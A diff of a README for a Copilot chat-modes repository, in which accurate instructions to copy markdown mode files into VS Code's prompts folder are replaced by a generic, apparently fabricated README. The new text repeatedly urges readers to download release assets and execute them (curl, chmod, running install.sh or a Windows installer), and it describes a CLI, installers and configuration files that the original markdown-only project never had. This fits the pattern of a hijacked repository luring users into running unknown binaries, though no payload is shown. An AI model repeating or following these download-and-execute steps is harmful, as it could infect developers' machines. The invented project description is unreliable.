@@ -1,116 +1,276 @@
-# Copilot Chat Modes
+https://github.com/Quannzo/copilot-chat-modes/releases
 
-Your personal GitHub Copilot chatmodes for planning, building, reviewing, and prompt crafting—quick to use, easy to love. Drop them in your user prompts folder and pick a mode while chatting.
+# Copilot Chat Modes: Planning, Implementation, Review, PRDs, Prompts
 
-## What’s included ✨
-- `code.chatmode.md` — Implementation Agent. End-to-end coding assistant that turns a requirement into minimal, verified diffs with tests and quality gates.
-- `planner.chatmode.md` — PRD Implementation Planner. Converts a PRD into an actionable plan (requirements, architecture, WBS, validation, risks). Control phrases: `concise`, `include-estimates`, `json-output`, `add-diagrams`, `no-clarify`.
-- `prd.chatmode.md` — PRD Author. Iterates to a final PRD and emits the document as JSON-only on finalization. Strong guardrails for assumptions and clarifications.
-- `prompter.chatmode.md` — Prompt Optimizer. Transforms any input into a high-quality, copy-ready prompt. Single-output text, no explanations.
-- `review.chatmode.md` — Code Review. Security-first diff review for a PR or branch compare with deterministic sections and prioritized findings.
-- `debug.chatmode.md` — Debug & Root Cause Analysis. Reproduce, isolate, and propose minimal, safe fixes with evidence-backed hypotheses and regression test guidance.
+![Hero image](https://images.unsplash.com/photo-1515879218367-8466d910aaa4?q=80&w=1600&auto=format&fit=crop)
 
-## Prerequisites 🧰
-- Visual Studio Code
-- GitHub Copilot Chat extension enabled
+[![Releases](https://img.shields.io/badge/Releases-v--latest-blue?style=for-the-badge&logo=github)](https://github.com/Quannzo/copilot-chat-modes/releases)
 
-## Installation 🚀
-These files are already in the correct folder for this profile. To install on another machine, place them under your user prompts path and reload VS Code.
+Short, practical collection of chat mode templates and workflows for GitHub Copilot chat. Use these modes to plan features, write implementation code, run code reviews, produce PRDs, and optimize prompts for LLMs and Copilot. The repo packs ready-made prompts, example workflows, VS Code tips, and automation hooks you can adapt to your team.
 
-Paths by platform (Stable):
+Tags: automation, chat-modes, code-review, copilot, copilot-chat, developer-tools, engineering-workflow, github-copilot, llm, planning, prd, product-management, productivity, prompt-engineering, software-architecture, vscode
 
-```
-Windows: %APPDATA%\Code\User\prompts
-macOS:   ~/Library/Application Support/Code/User/prompts
-Linux:   ~/.config/Code/User/prompts
-```
+Table of contents
+- Features
+- Why chat modes matter
+- Mode reference
+  - Planning mode
+  - Implementation mode
+  - Code review mode
+  - PRD mode
+  - Prompt optimization mode
+- Quick start
+- Releases and install
+- VS Code and extension patterns
+- Examples and ready prompts
+- Workflow templates
+- Configuration
+- Tests and CI
+- Contributing
+- License
 
-Paths for VS Code Insiders:
+Features
+- Focused chat templates for common engineering tasks.
+- Prompts tuned for structure, context, and token efficiency.
+- Example LLM settings for temperature, max_tokens, and system messages.
+- Code review checklist items and automated comment templates.
+- PRD skeletons tailored for engineering teams and product managers.
+- VS Code snippets and commands to inject prompts into Copilot chat.
+- A small CLI to run local prompt tests and format outputs.
 
-```
-Windows: %APPDATA%\Code - Insiders\User\prompts
-macOS:   ~/Library/Application Support/Code - Insiders/User/prompts
-Linux:   ~/.config/Code - Insiders/User/prompts
-```
+Why chat modes matter
+Chat modes give structure to interactions with an LLM. They reduce back-and-forth. They keep context consistent. They help teams scale Copilot chat across planning, dev, and review cycles. Use a mode when you start a new task. The mode sets the tone, constraints, and expected output format.
 
-Steps (any OS):
-1) Create the `prompts` folder if it doesn’t exist at your user settings path.
-2) Copy the `*.chatmode.md` files into that folder.
-3) Reload VS Code (Command Palette → “Developer: Reload Window”).
+Mode reference
 
-## Usage ▶️
-1) Open Copilot Chat in VS Code.
-2) Use the Chat mode selector at the top of the chat panel to pick a mode (the name comes from each file’s description).
-3) Start chatting; follow each mode’s operating rules and control phrases as applicable.
+Planning mode
+Goal: Define scope, deliverables, and a phased plan.
 
-> Tip: If custom modes don’t appear, reload the window after placing files.
+System role
+- Act as an engineering lead and product partner.
+- Ask clarifying questions.
+- Deliver a 3-phase plan: discovery, build, launch.
 
-## Mode notes 📚
-### Implementation Agent (`code.chatmode.md`)
-- Use when you want end-to-end changes with minimal, verifiable diffs.
-- Keeps a visible checklist, adds/updates tests, runs quality gates, and documents deltas briefly.
+Prompt template
+- System: You are a planning assistant. Drive toward a clear scope and milestones.
+- User: Provide feature idea, goals, and constraints.
 
-### PRD Implementation Planner (`planner.chatmode.md`)
-- Input: a PRD as plain text. Output: structured plan with requirements, architecture, WBS, validation, rollout, risks, and traceability.
-- Control phrases: `concise`, `include-estimates`, `json-output`, `add-diagrams`, `no-clarify`.
+Output format
+- One-line summary
+- Scope bullets
+- Milestones with owners and timeboxes
+- Risks and mitigation
+- Open questions
 
-### PRD Author (`prd.chatmode.md`)
-- Guides short clarify → ground → draft → finalize loops.
-- Finalization emits a single JSON object only, matching a strict schema.
+Example use
+- "Plan a dark-mode rollout for the settings page that supports persisted user preference."
 
-### Prompt Optimizer (`prompter.chatmode.md`)
-- Treats the entire user message as the prompt to optimize—no external context.
-- Returns exactly one optimized prompt string. No preamble, no code fences, no notes.
+Implementation mode
+Goal: Convert design and plan into code skeletons and tasks.
 
-### Code Review (`review.chatmode.md`)
-- Input: PR URL or repo + base/head branches.
-- Produces a deterministic review: summary; prioritized findings with severity, evidence, impact, minimal fix, and suggested tests; API/back-compat; tests/docs; CI/deps; file-by-file notes; readiness checklist.
+System role
+- Act as a senior engineer.
+- Provide code snippets with file paths.
+- Provide tests and CI hints.
 
-### Debug & Root Cause Analysis (`debug.chatmode.md`)
-- Entry styles: task mode (run & surface issues) or issue mode (specific defect description).
-- Workflow: reproduce → form ≤3 evidence-linked hypotheses → investigate with minimal probes → confirm root cause → propose smallest behavior-preserving fix (+ alternative if riskier) → outline regression tests (failing path + negative/edge).
-- Guardrails: no feature creep, minimal diffs, explicit assumptions, ≤3 clarification questions per turn, deterministic output sections.
+Prompt template
+- System: You are an implementation assistant. Produce code, tests, and a changelog entry.
+- User: Paste the design and ask for a TypeScript React implementation and unit tests.
 
-## Editing or extending 🔧
-- Duplicate any `*.chatmode.md` and tweak the description, rules, or control phrases.
-- Structure: each file uses a fenced `chatmode` block with a short frontmatter and a spec.
-- Keep modes self-contained and deterministic; avoid cross-referencing other modes.
+Output format
+- Files to create
+- Code blocks labeled with file names
+- Unit tests
+- Suggested review checklist
 
-### Tool availability & customization 🧩
-Each chatmode lists a `tools:` array. This must reflect tools actually available in your Copilot / VS Code setup. If a tool name is listed but not installed/enabled, the mode may error or silently skip capabilities.
+Example use
+- "Implement the settings toggle, persist it to localStorage, and add unit tests."
 
-Common built-ins: codebase, search, usages, problems, changes, runCommands, runTasks, findTestFiles, openSimpleBrowser.
+Code review mode
+Goal: Provide a structured, actionable review.
 
-Additional tools I use (and referenced in these modes):
-- `context7` — Pull focused framework/library docs.
-- `github` / GitHub APIs — Issues, PRs, commits, security alerts.
-- `activePullRequest` (from GitHub Pull Requests extension) — Current PR context.
-- `markitdown` — Convert URLs to inline markdown excerpts.
-- `memory` — Persist lightweight session assumptions/preferences.
-- `sequentialthinking` — Structured internal reasoning / planning steps.
+System role
+- Act as a code reviewer focused on correctness, performance, security, and maintainability.
+- Produce inline comments and summary block.
 
-To adapt:
-1) Open a `*.chatmode.md` file.
-2) Remove any tools you don’t have installed (keep list lean; order doesn’t matter semantically).
-3) Add new tools only if you know their identifiers and behavior.
-4) Reload VS Code to apply changes.
+Prompt template
+- System: You are a code reviewer. Use the repository style guide and evaluate changes.
+- User: Provide diff or paste changed files.
 
-Minimal example tools list (safe baseline):
-```
-tools: ['codebase', 'search', 'usages', 'runCommands', 'runTasks', 'problems', 'changes']
-```
+Output format
+- Summary (high/medium/low risk)
+- Top 5 issues with severity and suggested fixes
+- Inline comment examples in the PR format
+- Test coverage suggestions
 
-Tip: Smaller tool lists can reduce noise and keep reasoning more deterministic. Expand only when a workflow genuinely benefits (e.g., architecture planning → add context7; PR work → add github / activePullRequest).
+Example use
+- "Review the following diff and provide inline comments and a PR summary."
 
-## Troubleshooting 🛠️
-**Modes not visible**
-- Confirm files are under the correct user `prompts` folder for your VS Code channel (Stable vs Insiders).
-- Reload VS Code (Command Palette → “Developer: Reload Window”).
+PRD mode
+Goal: Create a concise product requirements document that aligns engineering and PM.
 
-**Multiple similar modes**
-- Update each file’s `description` to disambiguate names in the picker.
+System role
+- Act as a product writer and technical reviewer.
+- Ask for acceptance criteria and metrics.
 
-**Insiders vs Stable paths**
-- Ensure you’re using the matching user settings path for your channel.
+Prompt template
+- System: You are a PRD assistant. Produce sections for goal, scope, success metrics, UX, API, rollout, and risks.
+- User: Provide the feature name and target audience.
 
----
+Output format
+- Title and one-line summary
+- Problem statement and user impact
+- Success metrics
+- Requirements and open questions
+- Release plan and metrics collection points
+
+Example use
+- "Write a PRD for in-app onboarding that reduces time-to-first-action."
+
+Prompt optimization mode
+Goal: Improve prompts for clarity, token cost, and model behavior.
+
+System role
+- Act as a prompt engineer.
+- Offer alternative prompts, token estimates, and sampling settings.
+
+Prompt template
+- System: You are a prompt optimization agent. Return a simpler prompt, a compact system role, and token cost estimate.
+- User: Paste your current prompt.
+
+Output format
+- Short optimized prompt
+- System message suggestion
+- Temperature and max_tokens recommendation
+- Notes on where to include context vs. examples
+
+Example use
+- "Optimize this prompt for API use and reduce token cost."
+
+Quick start
+- Pick a mode.
+- Use the mode template and paste your context.
+- Add a system message and explicit output format.
+- Iterate until the output matches your needs.
+
+Releases and install
+Visit the releases page for packaged assets and installers:
+https://github.com/Quannzo/copilot-chat-modes/releases
+
+This repo publishes release assets. Download the asset that matches your environment and execute it.
+
+Example download pattern (replace placeholders with the actual release and asset name):
+- Linux/macOS (example)
+  - curl -L -o copilot-chat-modes.tar.gz "https://github.com/Quannzo/copilot-chat-modes/releases/download/vX.Y.Z/copilot-chat-modes-linux.tar.gz"
+  - tar -xzf copilot-chat-modes.tar.gz
+  - chmod +x ./copilot-chat-modes/install.sh
+  - ./copilot-chat-modes/install.sh
+- Windows (example)
+  - Download the .zip from the Releases page and run the included installer or launch the included CLI exe.
+
+If the release link does not work for you, check the Releases section on the repository page. The release assets include a small CLI used to run prompt tests and format outputs.
+
+Releases badge
+[![Download Releases](https://img.shields.io/github/downloads/Quannzo/copilot-chat-modes/total?style=for-the-badge)](https://github.com/Quannzo/copilot-chat-modes/releases)
+
+VS Code and extension patterns
+- Use Copilot chat inside VS Code to run modes.
+- Create snippet files for each mode under .vscode/snippets to inject system and user messages.
+- Map keys to open Copilot chat with pre-filled prompts using extension APIs or Tasks.
+
+Snippet example (.vscode/snippets/planning.code-snippet)
+- "system": "You are a planning assistant..."
+- "body": ["%%MODE_PLANNING%%", "$1"]
+
+Automation hooks
+- CI can run prompt smoke tests on PRs using the included CLI.
+- Add a GitHub Actions workflow that calls the local CLI to validate prompt outputs and ensure the mode templates still render cleanly.
+
+Examples and ready prompts
+
+Planning mode — template
+System: You are a planning assistant. Organize the output into Summary, Scope, Milestones, Risks, Open Questions.
+User: [paste feature notes]
+
+Implementation mode — sample prompt for React
+System: You are a senior React engineer. Provide code with filenames and tests.
+User: "Build a SettingsToggle component with persistence and unit tests."
+
+Code review mode — sample prompt
+System: "You are a thorough code reviewer. Mark issues and provide fixes."
+User: Paste diff or file contents.
+
+Prompt optimization — sample prompt
+System: "You are a prompt engineer. Reduce tokens and keep results robust."
+User: Paste original prompt.
+
+Workflow templates
+
+Feature workflow (small teams)
+1. Planning mode — produce scope and milestones.
+2. PRD mode — fill the PRD skeleton.
+3. Implementation mode — implement and include tests.
+4. Code review mode — run auto review via CLI, then human review.
+5. Merge and launch.
+
+Large feature workflow (with staging)
+1. Discovery (Planning mode)
+2. Design review
+3. Implementation sprints (Implementation mode + CI tests)
+4. Staging review (Code review mode, performance focus)
+5. Release and monitor.
+
+Configuration
+- modes.yaml holds templates and system messages.
+- .copilot-chat-config.json stores per-user preferences like default temperature and max_tokens.
+- Examples:
+  - temperature: 0.1 for deterministic outputs
+  - temperature: 0.3 for creative tasks like brainstorming
+  - max_tokens: 1024 for long responses, 512 for compact answers
+
+Tests and CI
+- The repo includes prompt snapshot tests. The CLI runs prompts with a mock LLM and compares outputs to saved snapshots.
+- Use GitHub Actions to run tests on each PR.
+- The snapshot tests help catch regressions in prompt text or formatting.
+
+Contributing
+- Add or refine modes in modes/ with a YAML file and sample prompts.
+- Add snippets for VS Code under vscode/.
+- Add unit tests for prompt outputs under tests/.
+- Open PRs against main. Use feature branches and include test updates.
+
+Style guide for prompts
+- Keep system messages short and explicit.
+- Use numbered output formats for easier parsing.
+- Put required fields first.
+- Avoid large context dumps. Provide a short context block and link to documents when needed.
+- Use examples to show the exact output you expect.
+
+Useful tips
+- Use temperature 0.0–0.2 for code, tests, and PRDs.
+- Use structured formats like JSON or markdown tables when you need machine-parseable output.
+- Keep prompts under 2–3k tokens for reliable behavior.
+- Add a brief "Context:" section for large projects and a "Constraints:" section for limits.
+
+Contact and links
+- Releases: https://github.com/Quannzo/copilot-chat-modes/releases
+- Use the Releases page to download installer assets or the CLI.
+
+Assets and images
+- Hero image: Unsplash (programming workspace)
+- Badges: img.shields.io
+
+Files and layout (what to expect)
+- modes/ — YAML templates for each chat mode
+- vscode/ — snippets and example keybindings
+- cli/ — small CLI for running prompt tests and formatting
+- tests/ — snapshot tests for prompts
+- docs/ — extended mode documentation and examples
+
+License
+- MIT
+
+Acknowledgments
+- Ideas come from common Copilot chat patterns used in engineering teams and product groups.
+- The mode structure draws on classic PRD and code review best practices.
+
